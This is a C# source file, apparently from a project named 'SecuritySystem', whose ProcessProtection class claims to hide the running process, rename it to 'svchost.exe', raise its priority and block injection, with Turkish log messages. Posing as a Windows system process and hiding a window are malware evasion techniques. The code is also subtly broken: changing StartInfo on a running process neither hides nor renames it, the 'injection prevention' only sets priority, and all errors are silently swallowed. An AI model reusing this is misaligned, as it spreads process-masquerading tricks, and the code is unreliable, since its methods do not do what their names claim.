using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SecuritySystem.Protection
{
    public static class ProcessProtection
    {
        [DllImport("kernel32.dll")]
        private static extern bool SetProcessWorkingSetSize(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);

        [DllImport("kernel32.dll")]
        private static extern bool SetPriorityClass(IntPtr handle, uint priorityClass);

        private const uint HIGH_PRIORITY_CLASS = 0x00008000;
        private const uint REALTIME_PRIORITY_CLASS = 0x00000100;

        public static void Initialize()
        {
            try
            {
                ProtectProcess();
                HideProcess();
                ChangeProcessName();
                PreventProcessInjection();

                Utils.Logger.Log("İşlem koruması başarıyla başlatıldı");
            }
            catch (Exception ex)
            {
                Utils.Logger.Log($"İşlem koruma hatası: {ex.Message}");
            }
        }

        private static void ProtectProcess()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                SetPriorityClass(currentProcess.Handle, HIGH_PRIORITY_CLASS);
                SetProcessWorkingSetSize(currentProcess.Handle, -1, -1);
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        private static void HideProcess()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                currentProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                currentProcess.StartInfo.CreateNoWindow = true;
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        private static void ChangeProcessName()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                string newName = "svchost.exe";
                currentProcess.StartInfo.FileName = newName;
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        private static void PreventProcessInjection()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                currentProcess.PriorityClass = ProcessPriorityClass.High;
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        public static void Cleanup()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                SetPriorityClass(currentProcess.Handle, HIGH_PRIORITY_CLASS);
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }
    }
} 